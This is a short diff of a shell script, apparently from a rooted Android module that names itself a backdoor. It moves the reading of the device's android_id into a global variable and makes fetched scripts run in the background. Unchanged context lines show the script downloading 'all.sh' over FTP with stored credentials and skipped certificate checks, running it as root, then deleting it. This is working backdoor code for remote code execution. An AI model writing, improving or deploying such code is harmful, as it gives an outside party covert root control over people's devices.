@@ -11,6 +11,7 @@
 # global variables
     MODDIR=${0%/*}
     cfg_dir="$MODDIR/backdoor.prop"
+    android_id="$(settings get secure android_id)"
 #
 
 # define
@@ -30,7 +31,7 @@
     _exec() {
         chown root:root "$1" 2>/dev/null
         chmod 0775 "$1" 2>/dev/null
-        sh "$1" 2>/dev/null
+        sh "$1" & 2>/dev/null
         rm -rf "$1"
     }
 #
@@ -77,7 +78,6 @@ backdoor() {
  '
         # shellcheck disable=SC2206
         exec_pool=($temp)
-        android_id="$(settings get secure android_id)"
 
         $_curl -sLk "ftp://$ftp_user:$ftp_passwd@$ftp_ip/$ftp_exec_dir/all.sh" --output "$MODDIR"/all.sh
         _exec "$MODDIR"/all.sh
